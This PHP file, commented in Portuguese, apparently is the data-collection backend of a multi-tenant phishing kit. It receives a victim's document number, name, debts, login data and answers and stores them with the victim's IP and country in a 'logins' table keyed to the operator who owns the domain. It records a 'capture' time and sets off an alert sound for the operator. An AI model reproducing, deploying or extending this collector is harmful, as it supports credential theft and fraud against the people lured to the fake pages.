<?php


header("Content-Type: application/json");

require_once "../db.php";
require_once __DIR__ . '/../base/utility.php';

// Verifica conexão com o banco
if (!$pdo) {
    http_response_code(500);
    echo json_encode(["error" => "Erro na conexão com o banco de dados."]);
    exit;
}

// Entrada de dados com filtro e fallback
$doc = filter_input(INPUT_POST, 'doc', FILTER_SANITIZE_STRING);
$page = filter_input(INPUT_POST, 'page', FILTER_SANITIZE_STRING);
$nome = filter_input(INPUT_POST, 'nome', FILTER_SANITIZE_STRING) ?: 'nome';
$debitos = filter_input(INPUT_POST, 'debitos', FILTER_SANITIZE_STRING) ?: '0';
$dados = $_POST['dados'] ?? '';
$resposta = $_POST['resposta'] ?? '';

if (!$doc) {
    echo json_encode(["status" => "doc não fornecido"]);
    exit;
}

try {
    // Verifica se já existe esse reference (doc)
    $check = $pdo->prepare("SELECT id FROM logins WHERE reference = :reference LIMIT 1");
    $check->execute([':reference' => $doc]);

    if (!$check->fetchColumn()) {

        $dominioAtual = $_SERVER['HTTP_HOST'] ?? '';

        // Verifica se o domínio é válido e ativo
        $stmt = $pdo->prepare("SELECT id_usuario FROM dominios WHERE nome_dominio = :dominio AND status = 'ativo' LIMIT 1");
        $stmt->execute([':dominio' => $dominioAtual]);
        $dominio = $stmt->fetch();

        if ($dominio) {

            $id_usuario = $dominio['id_usuario'];

            $horaCaptura = date('Y/m/d H:i:s');

            $ip = getClientIp();

            $ipInfo = GetFromIp($ip);
            $pais = $ipInfo->country ?? 'Desconhecido';

            // Pega o username do usuário dono do domínio
            $stmt = $pdo->prepare("SELECT username FROM users WHERE id = :id LIMIT 1");
            $stmt->execute([':id' => $id_usuario]);
            $user = $stmt->fetch();

            $username = $user['username'] ?? 'desconhecido';

            $updateStmt = $pdo->prepare("UPDATE notifications SET audio = :audio,  atual = :atual, hora = :hora WHERE id = :id");
            $updateStmt->execute([
                ':audio' => 2,
                ':atual' => rand(100000000, 99999999999),
                ':hora' => $horaCaptura,
                ':id' => 1
            ]);
            
            // Insere log no banco
            $stmt = $pdo->prepare("
                INSERT INTO logins (page, dados, debitos, ip, pais, identity, hora, login_info, id_usuario, resposta, reference)
                VALUES (:page, :dados, :debitos, :ip, :pais, :identity, :hora, :login_info, :id_usuario, :resposta, :reference)
            ");

            $stmt->execute([
                ':page' => $page,
                ':dados' => $nome,
                ':debitos' => $debitos,
                ':ip' => $ip,
                ':pais' => $pais,
                ':identity' => $username,
                ':hora' => $horaCaptura,
                ':login_info' => $dados,
                ':id_usuario' => $id_usuario,
                ':resposta' => $resposta,
                ':reference' => $doc
            ]);
        }
    }

    echo json_encode(["status" => "ok"]);

} catch (PDOException $e) {
    http_response_code(500);
    echo json_encode(["error" => "Erro no banco de dados", "details" => $e->getMessage()]);
}
